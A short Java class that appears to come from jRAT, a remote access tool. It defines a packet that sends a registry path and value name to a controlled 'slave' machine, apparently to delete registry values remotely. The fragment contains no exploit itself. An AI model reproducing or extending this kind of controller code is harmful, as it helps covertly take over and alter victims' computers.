package jrat.module.registry;

import jrat.controller.Slave;
import jrat.controller.packets.outgoing.AbstractOutgoingPacket;

import java.io.DataOutputStream;


public class PacketDelete extends AbstractOutgoingPacket {

	private String path;
	private String value;
	
	public PacketDelete(String path, String value) {
		this.path = path;
		this.value = value;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(path);
		slave.writeLine(value);
	}

	@Override
	public short getPacketId() {
		return 99;
	}

}
